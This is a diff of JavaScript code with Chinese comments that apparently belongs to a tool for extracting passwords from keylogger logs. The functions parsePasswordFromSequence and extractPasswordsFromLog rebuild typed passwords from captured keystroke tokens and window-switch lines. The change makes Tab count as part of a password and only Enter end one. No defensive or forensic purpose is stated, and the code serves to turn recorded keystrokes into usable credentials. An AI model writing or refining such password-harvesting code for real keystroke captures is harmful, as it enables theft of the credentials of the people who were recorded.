@@ -1632,6 +1632,15 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
             continue;
         }
         
+        // 忽略 [TAB] 键，不分割密码
+        if (item === '[TAB]') {
+            // 重置修饰键状态
+            shift = false;
+            ctrl = false;
+            alt = false;
+            continue;
+        }
+        
         if (item.startsWith('[') && item.endsWith(']')) {
             // 遇到其他功能键时，重置修饰键状态
             shift = false;
@@ -1644,6 +1653,11 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
             shift = false;
             ctrl = false;
             alt = false;
+            continue;
+        }
+
+        // 忽略换行符，只处理实际的密码字符
+        if (item === '\n') {
             continue;
         }
 
@@ -1727,7 +1741,8 @@ function extractPasswordsFromLog(content, filename) {
     };
 
     for (let i = 0; i < lines.length; i++) {
-        const line = lines[i].trim();
+        const originalLine = lines[i];
+        const line = originalLine.trim();
         if (!line) continue;
 
         // 窗口切换行
@@ -1767,10 +1782,19 @@ function extractPasswordsFromLog(content, filename) {
             if (token === '[LALT]' || token === '[RALT]') { altPressed = true; continue; }
             if (token === '[CAPSLOCK]') { capsLock = !capsLock; continue; }
 
-            // Tab / Enter 提交密码
-            if (token === '[TAB]' || token === '[ENTER]' || token === '[RETURN]') {
+            // Enter 提交密码，Tab 不作为分割符
+            if (token === '[ENTER]' || token === '[RETURN]') {
                 saveCurrentPassword();
                 rawSequence = [];
+                // 重置修饰键状态
+                shiftPressed = false;
+                ctrlPressed = false;
+                altPressed = false;
+                continue;
+            }
+            
+            // Tab 键作为密码的一部分，不分割密码
+            if (token === '[TAB]') {
                 // 重置修饰键状态
                 shiftPressed = false;
                 ctrlPressed = false;
@@ -1801,6 +1825,9 @@ function extractPasswordsFromLog(content, filename) {
                 shiftPressed = false;
             }
         }
+        
+        // 在每行结束后添加换行符到原始序列中，以保持与源文件的一致性
+        rawSequence.push('\n');
     }
 
     // 处理文件末尾未保存的序列
